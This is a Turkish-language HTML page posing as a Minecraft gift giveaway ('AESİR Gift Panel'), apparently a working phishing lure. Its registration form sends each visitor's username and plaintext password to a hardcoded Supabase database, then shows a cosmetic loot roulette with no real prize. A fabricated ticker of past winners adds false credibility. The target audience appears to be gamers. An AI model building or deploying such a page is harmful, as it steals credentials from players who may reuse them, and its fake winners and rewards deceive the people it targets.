<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AESİR | Minecraft Hediye Dağıtımı</title>
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --mc-green: #558d2e; --mc-dirt: #795548; --mc-dark: #1e1e1e; }
        body { background-color: var(--mc-dark); color: white; font-family: 'VT323', monospace; text-align: center; margin: 0; background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
        .live-winners { background: var(--mc-green); border-bottom: 4px solid #2d4d1a; padding: 10px; font-size: 20px; overflow: hidden; white-space: nowrap; }
        .winner-track { display: inline-block; animation: marquee 30s linear infinite; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        #notification { position: fixed; top: 20px; right: -400px; width: 300px; background: #222; border: 4px solid #555; padding: 15px; z-index: 1000; transition: right 0.5s; box-shadow: 6px 6px 0px rgba(0,0,0,0.5); }
        #notification.show { right: 20px; }
        nav { background: var(--mc-dirt); padding: 15px; border-bottom: 5px solid #4e342e; display: flex; justify-content: space-between; align-items: center; }
        #auth-container { margin: 50px auto; max-width: 400px; background: #c6c6c6; padding: 30px; border: 4px solid #555; border-top-color: #fff; border-left-color: #fff; box-shadow: 10px 10px 0px rgba(0,0,0,0.5); }
        input { width: 85%; padding: 12px; margin: 10px 0; background: #000; border: 2px solid #555; color: #00ff00; font-family: 'VT323'; font-size: 20px; outline: none; }
        .btn-mc { background: #7a7a7a; color: white; border: 3px solid #000; border-top-color: #bbb; border-left-color: #bbb; padding: 12px 25px; cursor: pointer; font-size: 24px; font-family: 'VT323'; text-shadow: 2px 2px #333; }
        .btn-mc:hover { background: var(--mc-green); }
        #game-container { display: none; padding: 20px; }
        .mc-chest { width: 150px; cursor: pointer; transition: 0.2s; image-rendering: pixelated; filter: drop-shadow(5px 5px 0px #000); }
        #roulette-section { display: none; margin-top: 30px; }
        .roulette-container { position: relative; width: 100%; max-width: 600px; height: 120px; margin: 20px auto; border: 6px solid #373737; background: #8b8b8b; overflow: hidden; }
        #roulette-strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
        .slot-item { min-width: 100px; height: 100px; display: flex; justify-content: center; align-items: center; border: 2px solid #373737; background: #8b8b8b; margin: 5px; }
        .slot-item img { width: 64px; image-rendering: pixelated; }
        #win-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
    </style>
</head>
<body>

<div class="live-winners">
    <div class="winner-track">• Steve kazandı: Elmas Kılıç • Herobrine kazandı: Netherite Külçesi • Alex kazandı: Büyülü Elma • Aesir_User kazandı: 64x Havai Fişek •</div>
</div>

<div id="notification"></div>

<nav>
    <div style="font-size: 30px; text-shadow: 2px 2px #000;">AESİR GİFT PANEL</div>
    <div id="user-display" style="color: #ffff55; font-size: 24px;"></div>
</nav>

<div id="auth-container">
    <h2 style="color: #333;">OYUNCU KAYDI</h2>
    <input type="text" id="username" placeholder="KULLANICI ADI">
    <input type="password" id="password" placeholder="ŞİFRE">
    <button class="btn-mc" style="width: 100%; margin-top: 15px;" onclick="kayitOlVeBasla()">HESAP OLUŞTUR VE AÇ</button>
</div>

<div id="game-container">
    <h1 id="welcome-msg" style="font-size: 40px;"></h1>
    <div id="gift-box-container">
        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="mc-chest" onclick="hediyeyiAc()">
        <p style="color:#ffff55; font-size: 24px;">SANDIĞI AÇMAK İÇİN TIKLA!</p>
    </div>
    <div id="roulette-section">
        <div class="roulette-container"><div id="roulette-strip"></div></div>
        <button id="spin-btn" class="btn-mc" onclick="ruletiBaslat()">KASAYI ÇEVİR!</button>
    </div>
</div>

<div id="win-popup">
    <div class="win-content">
        <h2 style="color: #ffff55; font-size: 40px;">BAŞARIM KAZANILDI!</h2>
        <img src="" id="won-item-display" style="width: 100px; image-rendering: pixelated;">
        <h3 id="won-item-title" style="font-size: 30px;"></h3>
        <button class="btn-mc" onclick="location.reload()">TEKRAR DENE</button>
    </div>
</div>

<script>
    // --- BURAYI SUPABASE PANELİNDEKİ BİLGİLERLE DOLDUR ---
    const SUPABASE_URL = "https://iigemvvlznvgneghevev.supabase.co/rest/v1/"; // URL doğru görünüyor
    const SUPABASE_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; // Anon Key'ini buraya koy
    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const itemHavuzu = [
        { ad: "Elmas Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
        { ad: "Netherite Zırh", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
        { ad: "Büyülü Elma", img: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
        { ad: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" }
    ];

    async function kayitOlVeBasla() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;

        if(!u || !p) return alert("Bilgileri gir!");

        // 1. Supabase'e kaydet (Arka planda çalışır)
        _supabase.from('users').insert([{ username: u, password: p }]).then(({error}) => {
            if(error) console.log("Kayıt hatası (Zaten var olabilir):", error.message);
        });

        // 2. Beklemeden direk oyuna sok
        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u;
        document.getElementById('user-display').innerText = "Oync: " + u;
    }

    function hediyeyiAc() {
        document.getElementById('gift-box-container').style.display = 'none';
        document.getElementById('roulette-section').style.display = 'block';
        const strip = document.getElementById('roulette-strip');
        strip.innerHTML = '';
        for(let i=0; i<50; i++) {
            const item = itemHavuzu[Math.floor(Math.random() * itemHavuzu.length)];
            strip.innerHTML += `<div class="slot-item"><img src="${item.img}"></div>`;
        }
    }

    function ruletiBaslat() {
        const strip = document.getElementById('roulette-strip');
        const btn = document.getElementById('spin-btn');
        btn.disabled = true;
        const move = 3000 + Math.floor(Math.random() * 1000);
        strip.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
        strip.style.transform = `translateX(-${move}px)`;
        setTimeout(() => {
            const win = itemHavuzu[Math.floor(Math.random() * itemHavuzu.length)];
            document.getElementById('win-popup').style.display = 'flex';
            document.getElementById('won-item-display').src = win.img;
            document.getElementById('won-item-title').innerText = win.ad;
        }, 4200);
    }
</script>
</body>
</html>
